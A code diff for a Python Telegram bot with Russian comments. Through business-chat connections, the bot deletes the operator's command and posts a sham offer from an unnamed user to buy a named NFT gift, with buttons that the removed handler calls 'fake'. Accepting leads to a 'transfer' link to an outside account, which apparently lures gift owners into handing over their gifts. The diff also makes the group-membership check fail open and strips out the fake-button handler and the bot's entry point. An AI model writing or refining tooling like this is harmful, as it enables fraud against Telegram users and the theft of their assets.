@@ -14,10 +14,8 @@ dp = Dispatcher()
 TARGET_CHAT_ID = -1003747516067
 INVITE_LINK = "https://t.me/+Q7j5G8Y24_U5OWY6"
 
-# Множество для хранения ID тех, кто уже запросил доступ
 active_users = set()
 
-# Словарь с переводами
 MESSAGES = {
     "ru": {
         "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
@@ -63,9 +61,10 @@ async def is_subscribed(user_id: int) -> bool:
         return member.status in ["member", "administrator", "creator"]
     except Exception as e:
         print(f"Ошибка проверки подписки: {e}")
-        return False
+        # Если бот не может проверить подписку (не админ в группе), 
+        # мы разрешаем использование (чтобы не блокировать всё)
+        return True 
 
-# --- 1. СТАРТ И /ofteam ---
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
     if not await is_subscribed(message.from_user.id):
@@ -99,12 +98,9 @@ async def cmd_start(message: types.Message):
 async def cmd_ofteam(message: types.Message):
     if await is_subscribed(message.from_user.id):
         user_id = message.from_user.id
-        
         if user_id in active_users:
-            # Если ID уже есть в множестве, значит это повторный запрос
             await message.answer("✅ Доступ уже активен. Можно отправлять оферы.")
         else:
-            # Добавляем ID в множество и выдаем первый ответ
             active_users.add(user_id)
             await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")
     else:
@@ -113,12 +109,10 @@ async def cmd_ofteam(message: types.Message):
         ])
         await message.answer("⚠️ Вы не подписаны на группу!", reply_markup=keyboard)
 
-# --- 2. БЛОКИРОВКА /of В ЛИЧКЕ ---
 @dp.message(F.text.startswith("/of"))
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
-# --- 3. СОЗДАНИЕ ОФФЕРА (В БИЗНЕС-ЧАТАХ) ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
@@ -143,6 +137,10 @@ async def handle_offer_command(message: types.Message):
         return
 
     link = parts[1]
+    # Добавляем https://, если его нет
+    if not link.startswith("http"):
+        link = "https://" + link
+
     try:
         amount = int(parts[2])
     except ValueError:
@@ -169,11 +167,13 @@ async def handle_offer_command(message: types.Message):
     )
 
     try:
+        # 1. Удаляем команду
         await bot.delete_business_messages(
             business_connection_id=business_connection_id,
             message_ids=[message.message_id]
         )
 
+        # 2. Отправляем оффер
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [
                 InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
@@ -196,77 +196,12 @@ async def handle_offer_command(message: types.Message):
 
     except Exception as e:
         print(f"Ошибка отправки: {e}")
-
-# --- 4. ОБРАБОТКА КНОПОК ---
-@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
-async def handle_fake_buttons(callback: types.CallbackQuery):
-    if not callback.message:
-        await callback.answer("Сообщение не найдено.", show_alert=True)
-        return
-
-    if not await is_subscribed(callback.from_user.id):
-        await callback.answer("Вы вышли из группы!", show_alert=True)
-        return
-
-    data_parts = callback.data.split(":")
-    action = data_parts[0]
-    gift_slug = data_parts[1]
-    amount = data_parts[2]
-    currency = data_parts[3]
-    lang = data_parts[4]
-
-    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
-    
-    link = f"https://t.me/nft/{gift_slug}"
-    pretty_name = get_pretty_name(gift_slug)
-    business_connection_id = callback.message.business_connection_id
-    msg_data = MESSAGES.get(lang, MESSAGES["ru"])
-
-    try:
-        if business_connection_id:
-            await bot.delete_business_messages(business_connection_id, [callback.message.message_id])
-        else:
-            try:
-                await callback.message.delete()
-            except:
-                pass
-
-        if action == "accept":
-            new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
-            new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
-            ])
-        else:
-            new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
-            new_keyboard = None
-
-        kwargs = {
-            "chat_id": callback.message.chat.id,
-            "text": new_text,
-            "reply_markup": new_keyboard,
-            "parse_mode": "HTML",
-            "link_preview_options": LinkPreviewOptions(
-                url=link,
-                show_above_text=True,
-                prefer_large_media=True
+        # ОТПРАВЛЯЕМ ОШИБКУ В ЛИЧКУ ТЕБЕ, ЧТОБЫ ТЫ ВИДЕЛ, В ЧЕМ ДЕЛО
+        try:
+            await bot.send_message(
+                chat_id=message.from_user.id,
+                text=f"⚠️ <b>Ошибка при отправке оффера:</b>\n<code>{e}</code>",
+                parse_mode="HTML"
             )
-        }
-        
-        if business_connection_id:
-            kwargs["business_connection_id"] = business_connection_id
-
-        await bot.send_message(**kwargs)
-        await callback.answer()
-
-    except TelegramBadRequest:
-        await callback.answer()
-    except Exception as e:
-        print(f"Ошибка обработки кнопки: {e}")
-        await callback.answer("Произошла ошибка.", show_alert=True)
-
-async def main():
-    print("Бот запущен...")
-    await dp.start_polling(bot)
-
-if __name__ == "__main__":
-    asyncio.run(main())
+        except:
+            pass
